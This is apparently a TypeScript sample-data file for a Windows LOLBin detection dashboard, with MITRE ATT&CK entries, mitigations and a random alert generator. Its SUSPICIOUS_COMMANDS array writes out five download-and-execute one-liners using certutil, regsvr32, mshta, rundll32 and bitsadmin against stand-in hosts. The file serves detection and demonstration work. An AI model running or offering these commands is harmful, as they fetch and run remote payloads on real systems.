import { LOLBin, DetectionAlert, MitreTechnique } from "../types";

// Sample LOLBins data
export const LOLBINS: LOLBin[] = [
  {
    name: "Certutil.exe",
    description: "Certificate utility for Windows, can be used to download files.",
    mitreTechniques: ["T1105", "T1140"],
    path: "C:\\Windows\\System32\\certutil.exe",
    type: "binary",
    riskLevel: "high",
  },
  {
    name: "Regsvr32.exe",
    description: "Used to register and unregister DLLs, can be used to bypass application whitelisting.",
    mitreTechniques: ["T1218.010", "T1117"],
    path: "C:\\Windows\\System32\\regsvr32.exe",
    type: "binary",
    riskLevel: "critical",
  },
  {
    name: "Mshta.exe",
    description: "Used to execute HTA files, can be used to bypass application whitelisting.",
    mitreTechniques: ["T1218.005"],
    path: "C:\\Windows\\System32\\mshta.exe",
    type: "binary",
    riskLevel: "critical",
  },
  {
    name: "Rundll32.exe",
    description: "Used to run DLL files, can be used to bypass application whitelisting.",
    mitreTechniques: ["T1218.011"],
    path: "C:\\Windows\\System32\\rundll32.exe",
    type: "binary",
    riskLevel: "critical",
  },
  {
    name: "Bitsadmin.exe",
    description: "Used to create and manage file transfers, can be used to download files.",
    mitreTechniques: ["T1197", "T1105"],
    path: "C:\\Windows\\System32\\bitsadmin.exe",
    type: "binary",
    riskLevel: "high",
  }
];

// Sample MITRE techniques
export const MITRE_TECHNIQUES: Record<string, MitreTechnique> = {
  "T1105": {
    id: "T1105",
    name: "Ingress Tool Transfer",
    description: "Adversaries may transfer tools or other files from an external system into a compromised environment.",
    url: "https://attack.mitre.org/techniques/T1105/",
    mitigation: "Use network intrusion detection/prevention systems to detect and block suspicious file transfers."
  },
  "T1140": {
    id: "T1140",
    name: "Deobfuscate/Decode Files or Information",
    description: "Adversaries may use obfuscated files or information to hide artifacts of an intrusion.",
    url: "https://attack.mitre.org/techniques/T1140/",
    mitigation: "Analyze file hashes and signatures to detect obfuscation techniques."
  },
  "T1218.010": {
    id: "T1218.010",
    name: "Regsvr32",
    description: "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code.",
    url: "https://attack.mitre.org/techniques/T1218/010/",
    mitigation: "Use Group Policy to disable Regsvr32.exe execution from user directories."
  },
  "T1117": {
    id: "T1117",
    name: "Regsvr32",
    description: "Adversaries may use Regsvr32.exe to execute malicious content.",
    url: "https://attack.mitre.org/techniques/T1117/",
    mitigation: "Use application control solutions to prevent Regsvr32 from loading untrusted DLLs."
  },
  "T1218.005": {
    id: "T1218.005",
    name: "Mshta",
    description: "Adversaries may abuse mshta.exe to proxy execution of malicious code.",
    url: "https://attack.mitre.org/techniques/T1218/005/",
    mitigation: "Block execution of mshta.exe through application control."
  },
  "T1218.011": {
    id: "T1218.011",
    name: "Rundll32",
    description: "Adversaries may abuse rundll32.exe to proxy execution of malicious code.",
    url: "https://attack.mitre.org/techniques/T1218/011/",
    mitigation: "Use Group Policy to restrict rundll32.exe execution from user directories."
  },
  "T1197": {
    id: "T1197",
    name: "BITS Jobs",
    description: "Adversaries may abuse BITS to download, execute, and clean up after code.",
    url: "https://attack.mitre.org/techniques/T1197/",
    mitigation: "Monitor for BITS jobs created by non-standard users or with suspicious parameters."
  }
};

// Sample suspicious commands
const SUSPICIOUS_COMMANDS = [
  "certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe",
  "regsvr32.exe /s /u /i:evil.sct scrobj.dll",
  "mshta.exe javascript:a=GetObject('script:http://evil-site.com/payload.sct').Exec();close();",
  "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil-site.com/payload.sct\")",
  "bitsadmin.exe /transfer myJob /download /priority high http://malicious-site.com/payload.exe %temp%\\payload.exe"
];

// Generate a random alert
export const generateRandomAlert = (): DetectionAlert => {
  const randomLolbin = LOLBINS[Math.floor(Math.random() * LOLBINS.length)];
  const randomCommand = SUSPICIOUS_COMMANDS[Math.floor(Math.random() * SUSPICIOUS_COMMANDS.length)];
  
  return {
    id: Math.random().toString(36).substring(2, 15),
    timestamp: Date.now(),
    lolbin: randomLolbin,
    process: randomLolbin.name,
    command: randomCommand,
    status: "new",
    details: `Suspicious ${randomLolbin.name} execution detected with potential ${randomLolbin.mitreTechniques.join(", ")} technique(s).`,
    affectedSystem: "DESKTOP-" + Math.random().toString(36).substring(2, 7).toUpperCase()
  };
};

// Format date for display
export const formatDate = (timestamp: number): string => {
  const date = new Date(timestamp);
  return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
};

// Get MITRE details for a technique ID
export const getMitreTechniqueDetails = (techniqueId: string): MitreTechnique | undefined => {
  return MITRE_TECHNIQUES[techniqueId];
};